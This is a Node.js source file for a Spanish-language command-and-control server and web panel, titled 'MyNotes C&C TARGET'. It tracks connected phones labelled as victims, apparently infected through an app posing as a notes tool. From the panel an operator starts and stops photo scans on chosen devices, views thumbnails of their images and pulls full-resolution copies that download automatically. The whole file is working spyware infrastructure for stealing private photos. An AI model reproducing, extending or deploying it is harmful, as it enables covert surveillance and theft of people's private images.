const express = require('express');
const http = require('http');
const { Server } = require("socket.io");
const cors = require('cors');

const app = express();
app.use(cors());

// --- CONFIGURACIÓN ---
const AUTH_PASS = "admin123"; 
const PORT = process.env.PORT || 3000;

// --- INTERFAZ WEB ---
app.get('/', (req, res) => {
    if (req.query.auth !== AUTH_PASS) {
        return res.send(`<body style="background:black;color:red;display:flex;justify-content:center;align-items:center;height:100vh;"><h2>ACCESO DENEGADO</h2></body>`);
    }

    res.send(`
    <html>
        <head>
            <title>MyNotes C&C TARGET</title>
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
            <style>
                :root { --bg: #0d0d0d; --panel: #161616; --primary: #00e676; --accent: #2979ff; --text: #e0e0e0; }
                body { font-family: 'JetBrains Mono', monospace; background: var(--bg); color: var(--text); margin: 0; padding: 0; height: 100vh; overflow: hidden; }
                
                .container { display: grid; grid-template-columns: 320px 1fr; height: 100%; }
                
                /* SIDEBAR */
                .sidebar { background: var(--panel); border-right: 1px solid #333; padding: 20px; display: flex; flex-direction: column; gap: 20px; }
                h1 { font-size: 16px; color: var(--primary); margin: 0; }

                /* SECCIONES */
                .section-title { font-size: 11px; color: #666; text-transform: uppercase; margin-bottom: 8px; font-weight: bold; }
                
                select { width: 100%; padding: 10px; background: #222; border: 1px solid #444; color: white; border-radius: 4px; outline: none; }
                select:focus { border-color: var(--accent); }

                button { width: 100%; padding: 12px; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; margin-bottom: 8px; color: white; }
                .btn-green { background: #00e676; color: black; }
                .btn-red { background: #ff1744; }

                /* GRID PRINCIPAL */
                .main-area { padding: 20px; overflow-y: auto; background: #0a0a0a; }
                .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); gap: 10px; }
                
                .card { background: #1e1e1e; border-radius: 6px; overflow: hidden; border: 1px solid #333; position: relative; }
                .card img { width: 100%; height: 140px; object-fit: cover; }
                .card-info { padding: 8px; font-size: 10px; color: #888; display: flex; justify-content: space-between; align-items: center; }
                
                /* ETILQUETA DE VÍCTIMA EN LA TARJETA */
                .victim-tag { position: absolute; top: 0; left: 0; background: rgba(0,0,0,0.7); color: #fff; padding: 2px 5px; font-size: 9px; }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="sidebar">
                    <h1>☠️ MyNotes TARGET</h1>

                    <div>
                        <div class="section-title">1. SELECCIONAR VÍCTIMA</div>
                        <select id="victimSelector" onchange="onVictimChanged()">
                            <option value="ALL">📢 TODAS LAS VÍCTIMAS</option>
                        </select>
                    </div>

                    <div>
                        <div class="section-title">2. ACCIONES DE ESCANEO</div>
                        <button class="btn-green" onclick="sendCommand('start')">▶ INICIAR ESCANEO</button>
                        <button class="btn-red" onclick="sendCommand('stop')">⏹ DETENER ESCANEO</button>
                    </div>
                    
                    <div style="margin-top:auto; font-size:10px; color:#555;">
                        <div id="stats">Esperando conexión...</div>
                    </div>
                </div>

                <div class="main-area">
                    <div class="grid" id="grid"></div>
                </div>
            </div>

            <script src="/socket.io/socket.io.js"></script>
            <script>
                const socket = io();
                const grid = document.getElementById('grid');
                const victimSelector = document.getElementById('victimSelector');
                
                // Mantiene un registro de qué tarjeta pertenece a qué víctima
                // Estructura: cardId -> victimId
                let cardOwners = {}; 
                let victimNames = {};

                // --- 1. GESTIÓN DE DISPOSITIVOS ---
                socket.on('update_device_list', (devices) => {
                    const current = victimSelector.value;
                    let html = '<option value="ALL">📢 TODAS LAS VÍCTIMAS (' + Object.keys(devices).length + ')</option>';
                    
                    for (const [id, info] of Object.entries(devices)) {
                        victimNames[id] = info.name; // Guardar nombre para mostrar en tarjeta
                        html += \`<option value="\${id}">📱 \${info.name}</option>\`;
                    }
                    victimSelector.innerHTML = html;
                    victimSelector.value = current;
                });

                // --- 2. FILTRADO VISUAL (Lo que pediste) ---
                function onVictimChanged() {
                    const selectedVictim = victimSelector.value;
                    const cards = document.getElementsByClassName('card');
                    
                    for (let card of cards) {
                        const owner = card.getAttribute('data-owner');
                        // Si es "ALL", mostramos todo. Si no, solo lo que coincida con el ID
                        if (selectedVictim === "ALL" || owner === selectedVictim) {
                            card.style.display = "block";
                        } else {
                            card.style.display = "none";
                        }
                    }
                }

                // --- 3. RECIBIR FOTOS ---
                socket.on('new_preview', data => {
                    // data.victimId viene del servidor ahora
                    renderCard(data);
                });

                function renderCard(data) {
                    if(document.getElementById(data.path)) return;
                    
                    // Solo renderizamos si coincide con el filtro actual o si estamos viendo "TODOS"
                    const currentFilter = victimSelector.value;
                    const isVisible = (currentFilter === "ALL" || currentFilter === data.victimId);

                    const div = document.createElement('div');
                    div.className = 'card';
                    div.id = data.path;
                    div.setAttribute('data-owner', data.victimId); // Marca de propiedad
                    div.style.display = isVisible ? 'block' : 'none';

                    // Nombre del dispositivo dueño de la foto
                    const ownerName = victimNames[data.victimId] || "Desconocido";

                    div.innerHTML = \`
                        <div class="victim-tag">\${ownerName}</div>
                        <img src="data:image/jpeg;base64,\${data.image64}" onclick="pedirHD('\${data.path}', '\${data.victimId}')" style="cursor:pointer">
                        <div class="card-info">
                            <span>\${data.folder}</span>
                            <span style="cursor:pointer; color:#00e676; font-weight:bold;" onclick="pedirHD('\${data.path}', '\${data.victimId}')">⚡ HD</span>
                        </div>
                    \`;
                    grid.prepend(div);
                }

                // --- 4. PEDIR HD (DIRIGIDO) ---
                function pedirHD(path, ownerId) {
                    // Aquí está la magia: enviamos el ID del dueño de la foto
                    console.log("Pidiendo foto a: " + ownerId);
                    socket.emit('order_download', { path: path, target: ownerId });
                }

                socket.on('receive_full', data => {
                    // Descarga automática al llegar
                    const link = document.createElement('a');
                    link.href = "data:image/jpeg;base64," + data.image64;
                    link.download = "HD_" + data.name;
                    document.body.appendChild(link);
                    link.click();
                    document.body.removeChild(link);
                    
                    // Marcar visualmente
                    const card = document.getElementById(data.path);
                    if(card) card.style.border = "2px solid #00e676";
                });

                // --- 5. ENVIAR COMANDOS (DIRIGIDO) ---
                function sendCommand(action) {
                    const target = victimSelector.value;
                    const cmd = action === 'start' ? 'start_scan' : 'stop_scan';
                    socket.emit('admin_command', { action: cmd, target: target });
                }

            </script>
        </body>
    </html>
    `);
});

const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*" }, maxHttpBufferSize: 1e8 });

let victims = {};

io.on('connection', (socket) => {

    // 1. REGISTRO
    socket.on('usrData', (data) => {
        if (data.dataType === 'register_device') {
            victims[socket.id] = { name: data.deviceName, id: data.deviceId };
            console.log(`📱 ${data.deviceName} conectado (${socket.id})`);
            io.emit('update_device_list', victims);
        }
        else if (data.dataType === 'preview_image') {
            // INYECTAMOS LA IDENTIDAD: El servidor le pega una etiqueta con el ID del socket
            data.victimId = socket.id; 
            socket.broadcast.emit('new_preview', data);
        }
        else if (data.dataType === 'full_image') {
            socket.broadcast.emit('receive_full', data);
        }
    });

    // 2. COMANDOS (Ahora con target obligatorio)
    socket.on('admin_command', (cmd) => {
        if (cmd.target === 'ALL') {
            socket.broadcast.emit('command_' + cmd.action);
        } else {
            // Enviar solo al socket específico seleccionado en el menú
            io.to(cmd.target).emit('command_' + cmd.action);
        }
    });

    // 3. PETICIÓN HD (Dirigida)
    socket.on('order_download', (data) => {
        if (data.target) {
            // Solo le pedimos la foto al dueño, no molestamos al resto
            io.to(data.target).emit('request_full_image', { path: data.path });
        }
    });

    socket.on('disconnect', () => {
        if (victims[socket.id]) {
            delete victims[socket.id];
            io.emit('update_device_list', victims);
        }
    });
});

server.listen(PORT, () => console.log('Server Target Ready'));
